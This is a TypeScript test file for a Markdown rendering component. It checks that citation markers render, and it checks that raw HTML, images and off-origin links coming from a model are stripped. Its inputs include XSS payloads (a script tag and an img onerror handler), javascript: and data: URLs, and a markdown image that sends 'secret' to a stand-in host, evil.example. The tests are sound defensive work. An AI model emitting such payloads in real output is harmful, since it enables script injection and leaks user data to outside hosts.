import { cleanup, render } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';
import { Markdown } from './Markdown';

const renderMarkdown = (text: string) =>
  render(<Markdown text={text} renderCitation={(n) => <mark data-n={n}>{n}</mark>} />).container;

describe('Markdown', () => {
  afterEach(cleanup);

  it('turns [1] and [1, 3] into citation markers, but not inside code', () => {
    const root = renderMarkdown('Leave is 25 days [1]. Carry-over is capped [1, 3]. See `a[2]`.');

    expect([...root.querySelectorAll('mark')].map((m) => m.dataset.n)).toEqual(['1', '1', '3']);
    expect(root.querySelector('code')?.textContent).toBe('a[2]');
    expect(root.textContent).toContain('Leave is 25 days 1.');
  });

  it('never renders raw HTML or images from the model', () => {
    const root = renderMarkdown(
      'Hi <script>alert(1)</script><img src=x onerror="alert(1)"> ![leak](https://evil.example/c?q=secret)',
    );

    expect(root.querySelector('script')).toBeNull();
    expect(root.querySelector('img')).toBeNull();
    expect(root.innerHTML).not.toContain('evil.example');
  });

  it('keeps links to our own origin and strips every other href', () => {
    const root = renderMarkdown(
      '[ours](/documents) [theirs](https://evil.example/x) [js](javascript:alert(1)) [data](data:text/html,x)',
    );

    const links = [...root.querySelectorAll('a')];
    expect(links.map((a) => a.textContent)).toEqual(['ours']);
    expect(links[0]?.getAttribute('href')).toBe(`${window.location.origin}/documents`);
    expect(links[0]?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(root.textContent).toContain('theirs');
  });
});
